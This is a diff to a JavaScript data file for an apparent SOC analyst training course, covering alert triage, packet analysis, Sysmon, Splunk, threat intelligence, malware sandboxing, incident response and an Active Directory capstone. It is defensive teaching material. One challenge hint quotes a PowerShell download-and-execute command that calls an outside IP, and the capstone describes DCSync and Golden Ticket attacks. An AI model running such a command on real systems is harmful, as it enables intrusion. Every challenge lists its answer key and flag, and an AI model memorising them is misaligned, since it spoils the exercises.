@@ -1,18 +1,23 @@
-// SOC Analyst Master Pathway - Comprehensive Course Curriculum Data
+// CyberSOC Academy Master Pathway - 8 Enterprise Modules Curriculum Data
 // Author: Mohammed Moshii (CSA, CEH, NASA Hall of Fame)
 
 export const SOC_MODULES = [
   {
     id: "soc-mod-01",
     slug: "soc-architecture-triage",
-    title: "Module 01: SOC Architecture & Alert Triage",
-    category: "Foundations",
+    moduleNumber: "01",
+    title: "SOC Fundamentals, Architecture & Incident Lifecycles",
+    category: "core",
+    categoryLabel: "Core Fundamentals",
+    status: "completed",
+    progress: 100,
     difficulty: "Beginner",
     duration: "45 Mins",
-    icon: "Shield",
-    summary: "Master the structure of modern Security Operations Centers, tiered analyst hierarchies, alert triage methodology, and false-positive reduction.",
+    slideCount: 16,
+    labCount: "3 Labs Completed (3/3)",
+    tags: ["NIST SP 800-61", "RFC 2828", "Escalation Flow"],
+    summary: "Establish defense operations foundation: SOC models, tier escalations, RFC 2828 taxonomy, and NIST SP 800-61 workflows.",
     
-    // Interactive Slides
     slides: [
       {
         id: 1,
@@ -102,7 +107,6 @@ export const SOC_MODULES = [
       }
     ],
 
-    // Theory & Guide
     theory: {
       overview: "Security Operations Centers operate on strict analytical workflows. In this module, we examine how enterprise telemetry converges into the SIEM and how a Tier 1 SOC analyst approaches incoming alerts methodically.",
       sections: [
@@ -133,10 +137,9 @@ export const SOC_MODULES = [
       ]
     },
 
-    // Interactive Lab Simulation
     lab: {
       title: "Interactive Alert Triage Simulator",
-      scenario: "Your SIEM queue has just flagged three concurrent security events on workstation 'WS-FINANCE-04'. You need to investigate the alerts, prioritize the incident, and determine if an active attacker has compromised the host.",
+      scenario: "Your SIEM queue has just flagged three concurrent security events on workstation 'WS-FINANCE-04'. Investigate the alerts, decode payloads, prioritize the incident, and determine if an active attacker has compromised the host.",
       type: "alert-triage-sim",
       alerts: [
         {
@@ -173,25 +176,30 @@ export const SOC_MODULES = [
       taskInstructions: "1. Decode the Base64 command from ALT-9021.\n2. Correlate with ALT-9022 to identify the C2 IP.\n3. Decide whether this is a True Positive and extract the malicious downloaded script filename."
     },
 
-    // Challenge Mode
     challenge: {
       question: "Base64 decode the PowerShell command in ALT-9021. What is the full URL or script name downloaded by the attacker?",
       targetKey: "matrix.ps1",
       flag: "flag{s0c_t1er1_tr1age_mast3red}",
       hint: "Look at the decoded payload: IEX (New-Object Net.WebClient).DownloadString('http://195.201.10.14:8080/matrix.ps1'). The flag is flag{s0c_t1er1_tr1age_mast3red}",
-      points: 100
+      points: 150
     }
   },
 
   {
     id: "soc-mod-02",
     slug: "network-traffic-wireshark-c2",
-    title: "Module 02: Network Security Monitoring & Packet Analysis",
-    category: "Network Defense",
+    moduleNumber: "02",
+    title: "Network Traffic Analysis & Packet Forensics",
+    category: "core",
+    categoryLabel: "Core Fundamentals",
+    status: "completed",
+    progress: 100,
     difficulty: "Intermediate",
     duration: "60 Mins",
-    icon: "Activity",
-    summary: "Deep dive into Wireshark, tcpdump, and Network Security Monitoring. Uncover C2 beacons, DNS tunneling, covert exfiltration, and ARP spoofing.",
+    slideCount: 18,
+    labCount: "5 Labs Completed (5/5)",
+    tags: ["Wireshark", "Zeek NSM", "DNS Exfil"],
+    summary: "Dissect anomalies in raw PCAP files, analyze TCP flags, write custom Snort signatures, and isolate covert DNS tunnels.",
 
     slides: [
       {
@@ -304,19 +312,25 @@ export const SOC_MODULES = [
       targetKey: "secret_project_x_2026",
       flag: "flag{dns_tunn3l_3xf1ltrat10n_d3t3ct3d}",
       hint: "Base64 decode 'c2VjcmV0X3Byb2plY3RfeF8yMDI2' to get 'secret_project_x_2026'. The flag is flag{dns_tunn3l_3xf1ltrat10n_d3t3ct3d}",
-      points: 100
+      points: 150
     }
   },
 
   {
     id: "soc-mod-03",
     slug: "endpoint-detection-sysmon-threat-hunting",
-    title: "Module 03: Endpoint Telemetry & Windows Sysmon Hunting",
-    category: "Endpoint Security",
+    moduleNumber: "03",
+    title: "Endpoint Telemetry & Host-Based Detection",
+    category: "siem",
+    categoryLabel: "SIEM & Telemetry",
+    status: "completed",
+    progress: 100,
     difficulty: "Intermediate",
     duration: "55 Mins",
-    icon: "Cpu",
-    summary: "Hunt adversaries on Windows endpoints using Sysinternals Sysmon, Windows Event Logs, and parent-child process anomalies.",
+    slideCount: 20,
+    labCount: "4 Labs Completed (4/4)",
+    tags: ["Sysmon v14", "WinEvent 4624", "Auditd"],
+    summary: "Audit Sysmon telemetry configs, detect Kerberoasting in Security.evtx, parse Linux Auditd, and isolate DLL process injection.",
 
     slides: [
       {
@@ -449,19 +463,25 @@ export const SOC_MODULES = [
       targetKey: "7720",
       flag: "flag{sysm0n_lsass_cr3d_dump_f0und}",
       hint: "Look at Event ID 10: SourceProcessId is 7720. The flag is flag{sysm0n_lsass_cr3d_dump_f0und}",
-      points: 100
+      points: 150
     }
   },
 
   {
     id: "soc-mod-04",
-    slug: "siem-detection-engineering-splunk-sigma",
-    title: "Module 04: SIEM Operations & Detection Engineering (Splunk & Sigma)",
-    category: "Detection Engineering",
+    slug: "siem-operations-log-aggregation",
+    moduleNumber: "04",
+    title: "SIEM Operations, Log Aggregation & Querying",
+    category: "siem",
+    categoryLabel: "SIEM & Telemetry",
+    status: "active",
+    progress: 60,
     difficulty: "Advanced",
     duration: "65 Mins",
-    icon: "Layers",
-    summary: "Write production Splunk Search Processing Language (SPL) queries, create correlation searches, translate Sigma rules, and detect password spraying.",
+    slideCount: 22,
+    labCount: "3 / 6 Labs Completed",
+    tags: ["Splunk SPL", "Elastic KQL", "Sigma Rules"],
+    summary: "Enterprise SPL scripting, Elastic KQL filters, unstructured regex extraction, and tuning Sigma rules against APT29 activity.",
 
     slides: [
       {
@@ -523,29 +543,25 @@ export const SOC_MODULES = [
       },
       {
         id: 4,
-        title: "Sigma: Generic Detection Signatures",
-        subtitle: "Write Detection Rules Once, Deploy on Any SIEM",
+        title: "Hunting APT29 C2 in Splunk",
+        subtitle: "Statistical Outlier Detection for HTTPS Jitter Callbacks",
         bullets: [
-          "Sigma is the open-source YAML standard for describing log detection logic independently of any vendor.",
-          "A single Sigma rule compiles cleanly to Splunk SPL, Elastic KQL, Microsoft Sentinel KQL, or QRadar AQL.",
-          "Rule anatomy: Title, Status, Logsource (product/service), Detection (selection criteria & condition), and Falsepositives."
+          "APT29 (Nobelium / Cozy Bear) leverages HTTPS POST requests with randomized jitter to evade simple firewall timers.",
+          "Use statistical functions `avg(count)` and `stdev(count)` grouped by destination IP.",
+          "Evaluate delta between connection frequency and average to identify tight, programmatic check-in routines.",
+          "Cross-reference matched IPs with external threat intelligence and JA3 SSL client hashes."
         ],
         diagram: `
- ┌──────────────────────────────────────────────┐
- │             SIGMA RULE (YAML)                │
- │  logsource: windows, sysmon                  │
- │  detection: Image contains 'mimikatz.exe'    │
- └──────────────────────┬───────────────────────┘
-                        ▼ [ pySigma Compiler ]
-       ┌────────────────┴────────────────┐
-       ▼                                 ▼
- [ Splunk SPL ]                  [ Sentinel KQL ]
- index=sysmon Image=*mimikatz*   DeviceProcessEvents | where...`
+ index=botsv3 sourcetype="stream:http" http_method="POST"
+ | bucket _time span=5m
+ | stats count, distinct_count(uri) by src_ip, dest_ip, _time
+ | eventstats avg(count) as avg_conn, stdev(count) as stdev_conn
+ | where abs(count - avg_conn) < 2 AND count > 12`
       }
     ],
 
     theory: {
-      overview: "Detection engineers construct the rules that power modern SOC defense. Here is the operational blueprint for Splunk and Sigma rule deployment.",
+      overview: "Detection engineers construct the rules that power modern SOC defense. Here is the operational blueprint for Splunk SPL and Sigma rule deployment.",
       sections: [
         {
           heading: "1. Production Splunk Detection Queries",
@@ -570,7 +586,7 @@ index=winsec EventCode=1102 OR EventCode=104
 
     lab: {
       title: "Interactive Splunk Terminal Query Lab",
-      scenario: "Run live Splunk SPL queries against an indexed corporate dataset to identify a compromised account being used for data staging.",
+      scenario: "Run live Splunk SPL queries against an indexed corporate dataset to identify a compromised account being used for data staging and unmask password sprayers.",
       type: "splunk-query-sim",
       dataset: [
         { _time: "2026-11-26 03:01", index: "winsec", eventCode: 4625, user: "j.doe", src_ip: "185.220.101.4", action: "Failed Login" },
@@ -586,19 +602,25 @@ index=winsec EventCode=1102 OR EventCode=104
       targetKey: "b.wayne",
       flag: "flag{spl_qu3ry_brut3f0rc3_unmask3d}",
       hint: "Look at the successful EventCode 4624 from 185.220.101.4. The username is b.wayne. The flag is flag{spl_qu3ry_brut3f0rc3_unmask3d}",
-      points: 100
+      points: 150
     }
   },
 
   {
     id: "soc-mod-05",
     slug: "threat-intelligence-mitre-attack",
-    title: "Module 05: Threat Intelligence & MITRE ATT&CK Mapping",
-    category: "Threat Hunting",
+    moduleNumber: "05",
+    title: "Threat Intelligence & MITRE ATT&CK Mapping",
+    category: "core",
+    categoryLabel: "Core Fundamentals",
+    status: "locked",
+    progress: 0,
     difficulty: "Advanced",
     duration: "50 Mins",
-    icon: "Flag",
-    summary: "Leverage the MITRE ATT&CK Framework, the Pyramid of Pain, and YARA rules to anticipate adversary tactics and attribute campaigns.",
+    slideCount: 16,
+    labCount: "4 Cyber Labs",
+    tags: ["MITRE ATT&CK", "MISP CTI", "YARA"],
+    summary: "Ingest MISP feeds, correlate adversary TTPs in ATT&CK Navigator, extract obfuscated IoCs via CyberChef, and draft YARA rules.",
 
     slides: [
       {
@@ -698,19 +720,137 @@ index=winsec EventCode=1102 OR EventCode=104
       targetKey: "\\\\.\\pipe\\msagent_55a9b",
       flag: "flag{yara_m1tr3_att4ck_hunt3r}",
       hint: "The named pipe is '\\\\.\\pipe\\msagent_55a9b'. The flag is flag{yara_m1tr3_att4ck_hunt3r}",
-      points: 100
+      points: 150
     }
   },
 
   {
     id: "soc-mod-06",
-    slug: "incident-response-containment-playbooks",
-    title: "Module 06: Incident Response & Ransomware Containment Playbooks",
-    category: "Incident Response",
+    slug: "malware-triage-dynamic-sandboxing",
+    moduleNumber: "06",
+    title: "Malware Triage & Dynamic Sandboxing",
+    category: "ir",
+    categoryLabel: "Incident Response",
+    status: "locked",
+    progress: 0,
+    difficulty: "Advanced",
+    duration: "65 Mins",
+    slideCount: 18,
+    labCount: "5 Dynamic Labs",
+    tags: ["Hybrid Sandbox", "Volatility 3", "PE Headers"],
+    summary: "Safe detonation in isolated sandboxes, static PE header analysis, macro de-obfuscation, and memory dump triage using Volatility 3.",
+
+    slides: [
+      {
+        id: 1,
+        title: "Malware Analysis Methodology in the SOC",
+        subtitle: "Static vs Dynamic vs Memory Forensics",
+        bullets: [
+          "Static Analysis: Inspecting binary attributes (PE headers, import tables, embedded strings, entropy) without executing the file.",
+          "Dynamic Analysis (Sandboxing): Detonating malware in an instrumented virtual machine to log process creation, file drops, registry modifications, and C2 beacons.",
+          "Memory Forensics: Using Volatility 3 to extract injected shellcode, unhooked DLLs, and in-memory decryption keys directly from RAM captures.",
+          "Safety Rule #1: Never analyze untrusted samples on your production host. Always isolate with network host-only or blackhole proxies."
+        ],
+        diagram: `
+ [ Suspicious Sample ] ──> [ Static Triage (Strings, PEStudio, Floss) ]
+                                    │
+                                    ▼
+       [ Dynamic Sandboxing (Cuckoo, ANY.RUN, Hybrid-Analysis) ]
+                                    │
+                                    ▼
+       [ Memory Dump Extraction (Volatility 3: pslist, malfind) ]`,
+        takeaway: "High entropy (> 7.2) across PE sections typically indicates packing or encryption (UPX, Themida, custom crypters)."
+      },
+      {
+        id: 2,
+        title: "Portable Executable (PE) Deep Dive",
+        subtitle: "Anatomy of Windows .EXE and .DLL Files",
+        bullets: [
+          "DOS Header: Always starts with magic bytes `4D 5A` ('MZ' for Mark Zbikowski).",
+          "PE Header: Contains the signature `50 45 00 00` ('PE\\0\\0') and the Optional Header defining the EntryPoint address.",
+          "Sections: `.text` (executable code), `.data` (initialized global variables), `.rsrc` (icons, manifests, embedded payloads).",
+          "Import Address Table (IAT): Reveals what Windows APIs the binary calls (e.g., `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`)."
+        ]
+      },
+      {
+        id: 3,
+        title: "Memory Forensics with Volatility 3",
+        subtitle: "Uncovering Process Injection and Rootkits",
+        bullets: [
+          "`windows.pslist`: Lists all running processes walking the ActiveProcessLinks doubly-linked list.",
+          "`windows.psscan`: Scans raw memory pool tags for unlinked (hidden) processes used by rootkits.",
+          "`windows.malfind`: Locates memory pages marked `PAGE_EXECUTE_READWRITE` (RWX) containing unmapped MZ headers or injected shellcode.",
+          "`windows.netscan`: Reconstructs active and terminated network sockets with associated PIDs at the moment of memory dump."
+        ],
+        diagram: `
+ VOLATILITY 3 COMMAND SEQUENCE:
+ vol -f mem.raw windows.pslist
+ vol -f mem.raw windows.malfind --pid 4280
+ vol -f mem.raw windows.dumpfiles --pid 4280 --virtaddr 0x7ffd0000`
+      }
+    ],
+
+    theory: {
+      overview: "When automated EDR engines fail to classify a custom binary, Tier 2 analysts leverage safe sandboxing and memory triage to classify the threat.",
+      sections: [
+        {
+          heading: "1. Key API Calls Indicating Process Hollowing",
+          content: "Watch for this sequence of API calls in sandbox execution traces:",
+          table: {
+            headers: ["API Call", "Purpose in Attack Chain", "Legitimate Rarity"],
+            rows: [
+              ["CreateProcess (CREATE_SUSPENDED)", "Spawns legitimate host process (e.g., svchost.exe) paused", "High"],
+              ["ZwUnmapViewOfSection", "Hollows out original executable memory from process", "Extremely Suspicious"],
+              ["VirtualAllocEx (PAGE_EXECUTE_READWRITE)", "Allocates new executable memory buffer inside target process", "Very High"],
+              ["WriteProcessMemory", "Copies encrypted shellcode / payload into hollowed space", "High"],
+              ["ResumeThread", "Resumes execution of malicious code under benign disguise", "Normal after create"]
+            ]
+          }
+        }
+      ]
+    },
+
+    lab: {
+      title: "Interactive Sandbox Detonation Inspector",
+      scenario: "A macro-laden invoice 'Invoice_Q4_2026.xlsm' was detonated in your isolated sandbox. Analyze the Volatility 3 malfind output below to pinpoint the injected memory address and malware payload family.",
+      type: "sandbox-sim",
+      processList: [
+        { pid: 1040, name: "EXCEL.EXE", ppid: 880, integrity: "Medium", path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" },
+        { pid: 3244, name: "powershell.exe", ppid: 1040, integrity: "Medium", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" },
+        { pid: 4892, name: "rundll32.exe", ppid: 3244, integrity: "High", path: "C:\\Windows\\System32\\rundll32.exe" }
+      ],
+      malfindOutput: `Process: rundll32.exe Pid: 4892 Address: 0x0000021b8f400000
+Protection: PAGE_EXECUTE_READWRITE
+0x0000021b8f400000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  MZ..............
+0x0000021b8f400010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  ........@.......
+Tag: LummaStealer_MemoryInjected_Payload_v4`,
+      taskInstructions: "1. Inspect the process spawning hierarchy: EXCEL.EXE ➔ powershell.exe ➔ rundll32.exe.\n2. Note the hollowed process 'rundll32.exe' (PID: 4892) running with PAGE_EXECUTE_READWRITE.\n3. Identify the injected malware family tag in the Volatility output."
+    },
+
+    challenge: {
+      question: "What is the specific malware tag identified in the memory injection buffer of rundll32.exe (PID 4892)?",
+      targetKey: "LummaStealer_MemoryInjected_Payload_v4",
+      flag: "flag{m4lw4r3_v0l4t1l1ty_tr14g3}",
+      hint: "Look at the Tag field in the Volatility output: 'LummaStealer_MemoryInjected_Payload_v4'. The flag is flag{m4lw4r3_v0l4t1l1ty_tr14g3}",
+      points: 150
+    }
+  },
+
+  {
+    id: "soc-mod-07",
+    slug: "live-incident-response-playbooks",
+    moduleNumber: "07",
+    title: "Live Incident Response & Playbook Automation",
+    category: "ir",
+    categoryLabel: "Incident Response",
+    status: "locked",
+    progress: 0,
     difficulty: "Advanced",
     duration: "70 Mins",
-    icon: "AlertTriangle",
-    summary: "Execute the NIST SP 800-61 IR lifecycle. Triage malicious phishing emails, execute emergency host containment, and neutralize live ransomware outbreaks.",
+    slideCount: 16,
+    labCount: "4 Simulation Labs",
+    tags: ["SOAR Playbooks", "Containment", "Chain of Custody"],
+    summary: "Construct automated SOAR response workflows, enforce active ransomware containment, manage evidence custody, and author PIR root cause logs.",
 
     slides: [
       {
@@ -815,7 +955,95 @@ SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
       targetKey: "198.51.100.77",
       flag: "flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
       hint: "Look at the Received header and Authentication-Results: sender IP is 198.51.100.77. The flag is flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
-      points: 100
+      points: 150
+    }
+  },
+
+  {
+    id: "soc-mod-08",
+    slug: "capstone-cyber-range-simulation",
+    moduleNumber: "08",
+    title: "Capstone Red vs Blue Cyber Range Simulation",
+    category: "ir",
+    categoryLabel: "Incident Response",
+    status: "locked",
+    progress: 0,
+    difficulty: "Expert",
+    duration: "4 Hours",
+    slideCount: 16,
+    labCount: "5 Enterprise Range Drills",
+    tags: ["4-Hour Live Fire", "Active Directory", "Exec Briefing"],
+    summary: "4-hour live hostile assault against an enterprise Active Directory domain: defend against Kerberos ticket forgery and deliver executive threat briefings.",
+
+    slides: [
+      {
+        id: 1,
+        title: "The Enterprise Cyber Range Battlefield",
+        subtitle: "Full-Spectrum Red Team Emulation Defense",
+        bullets: [
+          "The capstone exercise mirrors an unannounced APT adversary targeting a hybrid enterprise Active Directory environment.",
+          "Target Assets: Primary Domain Controller (`DC01.ACME.CORP`), Internal Certificate Authority (ADCS), and Financial Database Cluster.",
+          "Red Team Arsenal: BloodHound path discovery, Kerberoasting, AS-REP Roasting, Golden/Silver Ticket forgery, and DCSync replication."
+        ],
+        diagram: `
+ ┌────────────────────────────────────────────────────────┐
+ │              ENTERPRISE CYBER RANGE HUD                │
+ ├────────────────────────────────────────────────────────┤
+ │ Perimeter: 2 Edge Firewalls + Cloud Proxy              │
+ │ Internal: 1 Forest, 2 Trees, 450 Virtualized Endpoints  │
+ │ Defense Team: Lead SOC Analyst + IR Engineers          │
+ └────────────────────────────────────────────────────────┘`
+      },
+      {
+        id: 2,
+        title: "Active Directory Identity Attacks",
+        subtitle: "Kerberoasting, DCSync & Golden Tickets",
+        bullets: [
+          "Kerberoasting (T1558.003): Requesting TGS service tickets for SPNs and cracking hashes offline.",
+          "DCSync (T1003.006): Simulating domain replication via `GetNCChanges` to steal all NTLM password hashes without executing code on the DC.",
+          "Golden Ticket (T1558.001): Forging a Kerberos Ticket Granting Ticket (TGT) using the `krbtgt` account NTLM hash, granting god-mode domain access.",
+          "Mitigation: Enforce AES Kerberos encryption, reset `krbtgt` password twice yearly, and monitor Event ID 4662 (Access to DS-Replication-Get-Changes-All)."
+        ]
+      }
+    ],
+
+    theory: {
+      overview: "The capstone puts all skills together: network monitoring, Sysmon process hunting, Splunk query tuning, threat intelligence attribution, and incident containment.",
+      sections: [
+        {
+          heading: "1. Capstone Attack Reconstruction",
+          content: "Correlate telemetry across Windows Security Log Event IDs:",
+          table: {
+            headers: ["Event ID", "Meaning", "Adversary Technique"],
+            rows: [
+              ["4768", "Kerberos TGT requested", "Authentication Ticket Request"],
+              ["4769", "Kerberos Service Ticket (TGS) requested", "Kerberoasting (Check for RC4-HMAC encryption type 0x17)"],
+              ["4672", "Special privileges assigned to new logon", "Privilege Escalation to Domain Admin"],
+              ["4662", "Operation performed on Active Directory object", "DCSync attack against Domain Root"]
+            ]
+          }
+        }
+      ]
+    },
+
+    lab: {
+      title: "Interactive Active Directory Defense Simulator",
+      scenario: "During the live capstone assault, alerts indicate an unauthorized replication request against the primary Domain Controller. Identify the compromised service account used to launch the DCSync command.",
+      type: "ad-defense-sim",
+      logs: [
+        { time: "05:12:01", id: 4769, service: "krbtgt", account: "svc_backup@ACME.CORP", ip: "10.0.10.88", ticketOptions: "0x40810010", encType: "0x17 (RC4)" },
+        { time: "05:14:22", id: 4662, object: "CN=Configuration,DC=ACME,DC=CORP", account: "svc_backup@ACME.CORP", accessMask: "0x100", extendedRight: "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)" },
+        { time: "05:15:00", id: 4624, account: "Administrator", ip: "10.0.10.88", logonType: 3, note: "Golden Ticket Used" }
+      ],
+      taskInstructions: "1. Notice Event ID 4662 indicating DS-Replication-Get-Changes-All.\n2. Note the account executing the DCSync: 'svc_backup@ACME.CORP'.\n3. This account must be locked immediately to sever attacker persistence."
+    },
+
+    challenge: {
+      question: "Which compromised Active Directory account executed the unauthorized DCSync replication request in the capstone range?",
+      targetKey: "svc_backup@ACME.CORP",
+      flag: "flag{c4pst0n3_d0m41n_d3f3nd3d}",
+      hint: "Look at Event ID 4662: account is 'svc_backup@ACME.CORP'. The flag is flag{c4pst0n3_d0m41n_d3f3nd3d}",
+      points: 200
     }
   }
 ];
